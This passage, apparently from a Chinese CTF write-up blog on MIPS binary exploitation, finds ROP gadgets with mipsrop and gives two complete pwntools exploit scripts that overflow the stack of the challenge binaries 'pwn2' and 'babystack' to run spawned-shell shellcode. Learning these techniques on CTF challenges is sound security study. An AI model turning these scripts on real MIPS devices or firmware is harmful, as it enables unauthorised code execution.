class="line">|  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                    |  jalr  $s3                             |</span><br><span class="line">|  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                    |  jalr  $s0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 13 matching gadgets</span><br></pre></td></tr></table></figure>
+<p>显然 addiu 到寄存器 A 的内容是我们输入的、可控的，可以在这范围内写 shellcode。之后 jmp 到寄存器 B，就需要再 jmp 回来到 A 存储的位置执行 shellcode。比如上面的第一条 gadget ，$s0 的内容应该是 <code>jmp $a2</code>，第二条gadget的 $s2 应该是 <code>jmp $a2</code>。而这些 s  寄存器在 MIPS 中是用于 <code>saved value</code>  的，有保存现场就会有恢复现场，因此在每个函数末尾 return 的时候都会有  <code>lw $s?,?+var_?($sp)</code> 的操作。前面 <code>loc_400a2c</code> 的图就是这个 pwn 函数的返回步骤，可以看到 <code>$s0~$s7</code>全用上了，用 mipsrop 找到的 gadgets 都可用，可通过栈上的内容来控制 s寄存器的内容。从一个寄存器 jmp 到另一个寄存器，用的是临时寄存器，一般用 $t9：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.find(&quot;move $t9,$a2&quot;)</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                      |  Control Jump                          |</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00421684  |  move $t9,$a2                                |  jr    $a2                             |</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+<p>算好 $s0 、$a2的位置就可以了。用其他 gadget 的话，改下offset就可以了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,bits=<span class="number">32</span>,endian=<span class="string">&#x27;big&#x27;</span>,binary=ELF(<span class="string">&#x27;./pwn2&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mips&#x27;, &#x27;-g&#x27;,&#x27;2230&#x27;, &#x27;./pwn2&#x27;])</span></span><br><span class="line"><span class="comment"># rop = ROP(context.binary)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#$0 offset: $cur_i+0x58+0x14=$cur_i+0x6c</span></span><br><span class="line"><span class="comment">#shellcode offset: $sp+0x70+var_c=$sp+0x70-0x0c=$sp+0x64</span></span><br><span class="line">jmp_a2=<span class="number">0x00421684</span><span class="comment">#jr $a2</span></span><br><span class="line">gadget=<span class="number">0x004273C4</span><span class="comment">#jr $s0</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))#0x7c</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;.\&#x27; \n&#x27;</span>)</span><br><span class="line">py=<span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(jmp_a2)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x6c</span>-<span class="number">4</span>)+p32(gadget)</span><br><span class="line">py+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span>+shellcode+<span class="string">&#x27;.&#x27;</span></span><br><span class="line">sl(py)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+<p>顺便提一下，如果 ubuntu16 下的 shellcode 生成不了，可以检查下是不是 binutils 缺少 mips 架构版本的问题，正常来说应该是会返回一个 gnu 数组的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import*</span><br><span class="line">&gt;&gt;&gt; pwnlib.asm.dpkg_search_for_binutils(&#x27;mips&#x27;, &#x27;as&#x27;)</span><br><span class="line">[&#x27;binutils-mips-linux-gnu&#x27;, &#x27;binutils-mipsel-linux-gnu&#x27;]</span><br></pre></td></tr></table></figure>
+<p>原因是 ubuntu 16 自带的 binutils 版本旧，安装下对应的 gnu 就可以了。或者用 ubuntu18 以上的版本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install binutils-mips-linux-gnu</span><br></pre></td></tr></table></figure>
+<h3 id="ctfshow-内部赛-babystack"><a class="header-anchor" href="#ctfshow-内部赛-babystack">¶</a>ctfshow 内部赛 babystack</h3>
+<blockquote>
+<p>mips-32-little</p>
+</blockquote>
+<p>ret2shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from struct import pack</span></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,bits=<span class="number">32</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./main&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process([&#x27;qemu-mipsel&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;-g&#x27;,&#x27;2230&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line"><span class="comment"># rop = ROP(context.binary)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">name=<span class="number">0x00410C20</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">ru(<span class="string">&#x27;message:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x34</span>+p32(name))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+<h2 id="2-2-堆漏洞"><a class="header-anchor" href="#2-2-堆漏洞">¶</a>2.2 堆漏洞</h2>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/mips/" rel="tag"># mips</a>
+          </div>
+
+        
+
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">7ee1n</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">9k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">8 mins.</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
